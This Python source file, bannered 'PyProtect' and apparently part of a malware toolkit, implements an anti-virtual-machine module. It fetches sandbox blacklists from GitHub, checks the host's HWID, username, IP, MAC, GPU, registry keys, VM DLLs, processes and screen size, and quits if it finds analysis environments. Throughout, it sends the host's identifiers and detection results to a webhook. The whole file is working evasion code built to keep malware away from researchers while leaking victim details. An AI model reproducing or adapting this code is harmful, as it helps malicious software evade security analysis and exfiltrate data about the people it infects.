"""
    ____          ____                __               __
   / __ \\ __  __ / __ \\ _____ ____   / /_ ___   _____ / /_
  / /_/ // / / // /_/ // ___// __ \\ / __// _ \\ / ___// __/
 / ____// /_/ // ____// /   / /_/ // /_ /  __// /__ / /_
/_/     \\__, //_/    /_/    \\____/ \\__/ \\___/ \\___/ \\__/
       /____/

Made With ❤️ By Ghoul & Marci
"""

import ctypes
import os
import re
import sys
import uuid

import httpx

from ..constants import Lists, UserInfo
from ..utils.webhook import Webhook


class AntiVM:
    def __init__(self, webhook_url: str, logger, should_exit: bool) -> None:
        self.webhook_url = webhook_url
        self.logger = logger
        self.webhook = Webhook(self.webhook_url)
        self.should_exit = should_exit

        self.hwidlist = httpx.get(
            "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt"
        )
        self.pcnamelist = httpx.get(
            "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt"
        )
        self.pcusernamelist = httpx.get(
            "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
        )
        self.iplist = httpx.get(
            "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt"
        )
        self.maclist = httpx.get(
            "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt"
        )
        self.gpulist = httpx.get(
            "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt"
        )
        self.platformlist = httpx.get(
            "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt"
        )

    def get_base_prefix_compat(self) -> None:  # define all of the checks
        return (
            getattr(sys, "base_prefix", None)
            or getattr(sys, "real_prefix", None)
            or sys.prefix
        )

    def CheckLists(self) -> None:
        try:
            if UserInfo.HWID in self.hwidlist.text:
                self.webhook.send(
                    f"**Blacklisted HWID Detected. HWID:** `{UserInfo.HWID}`",
                    "Anti VM")
                if self.should_exit:
                    os._exit(1)
        except BaseException:
            self.webhook.send(
                "[ERROR]: Failed to connect to database.",
                "Anti VM")
            if self.should_exit:
                os._exit(1)

        try:
            if UserInfo.USERNAME in self.pcusernamelist.text:
                self.webhook.send(
                    f"**Blacklisted PC User:** `{UserInfo.USERNAME}`",
                    "Anti VM")
                if self.should_exit:
                    os._exit(1)
        except BaseException:
            self.webhook.send(
                "[ERROR]: Failed to connect to database.",
                "Anti VM")
            if self.should_exit:
                os._exit(1)

        try:
            if UserInfo.PC_NAME in self.pcnamelist.text:
                self.webhook.send(
                    f"**Blacklisted PC Name:** `{UserInfo.PC_NAME}`", "Anti VM"
                )
                if self.should_exit:
                    os._exit(1)
        except BaseException:
            self.webhook.send(
                "[ERROR]: Failed to connect to database.",
                "Anti VM")
            if self.should_exit:
                os._exit(1)

        try:
            if UserInfo.IP in self.iplist.text:
                self.webhook.send(
                    f"**Blacklisted IP:** `{UserInfo.IP}`", "Anti VM")
                if self.should_exit:
                    os._exit(1)
        except BaseException:
            self.webhook.send(
                "[ERROR]: Failed to connect to database.",
                "Anti VM")
            if self.should_exit:
                os._exit(1)

        try:
            if UserInfo.MAC in self.maclist.text:
                self.webhook.send(
                    f"**Blacklisted MAC:** `{UserInfo.MAC}`", "Anti VM")
                if self.should_exit:
                    os._exit(1)
        except BaseException:
            self.webhook.send(
                "[ERROR]: Failed to connect to database.",
                "Anti VM")
            if self.should_exit:
                os._exit(1)

        try:
            if UserInfo.GPU in self.gpulist.text:
                self.webhook.send(
                    f"**Blacklisted GPU:** `{UserInfo.GPU}`", "Anti VM")
                if self.should_exit:
                    os._exit(1)
        except BaseException:
            self.webhook.send(
                "[ERROR]: Failed to connect to database.",
                "Anti VM")
            if self.should_exit:
                os._exit(1)

    def CheckVirtualEnv(self) -> None:
        if self.get_base_prefix_compat() != sys.prefix:
            if self.should_exit:
                os._exit(1)

    def CheckRegistry(self) -> None:
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
        )
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )

        if reg1 != 1 and reg2 != 1:
            self.webhook.send("VMware Registry Detected", "Anti DLL")
            if self.should_exit:
                os._exit(1)

    def CheckMacAddress(self) -> None:
        mac_address = ":".join(re.findall("..", "%012x" % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            self.webhook.send("**VMware MAC Address Detected**", "Anti VM")
            if self.should_exit:
                os._exit(1)

    def CheckScreenSize(self) -> None:
        x = ctypes.windll.user32.GetSystemMetrics(0)
        y = ctypes.windll.user32.GetSystemMetrics(1)
        if x <= 200 or y <= 200:
            self.webhook.send(
                f"Screen Size Is: **x**: {x} | **y**: {y}",
                "Anti VM")
            if self.should_exit:
                os._exit(1)

    def CheckProcessesAndFiles(self) -> None:
        vmware_dll = os.path.join(
            os.environ["SystemRoot"],
            "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(
            os.environ["SystemRoot"], "vboxmrxnp.dll")

        process = os.popen(
            'TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="'
        ).read()
        processList = []

        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(
                    processNames.replace(
                        "K\n",
                        "").replace(
                        "\n",
                        ""))

        if any(Lists.VIRTUAL_MACHINE_PROCESSES) in processList:
            self.logger.info("Blacklisted Virtual Machine Process Running")
            self.webhook.send(
                "Blacklisted Virtual Machine Process Running",
                "Anti VM")
            if self.should_exit:
                os._exit(1)

        if os.path.exists(vmware_dll):
            self.webhook.send("**Vmware DLL Detected**", "Anti VM")
            if self.should_exit:
                os._exit(1)

        if os.path.exists(virtualbox_dll):
            self.webhook.send("**VirtualBox DLL Detected**", "Anti VM")
            if self.should_exit:
                os._exit(1)

    def StartChecks(self) -> None:
        self.CheckVirtualEnv()
        self.CheckRegistry()
        self.CheckMacAddress()
        self.CheckScreenSize()
        self.CheckProcessesAndFiles()
        self.CheckLists()
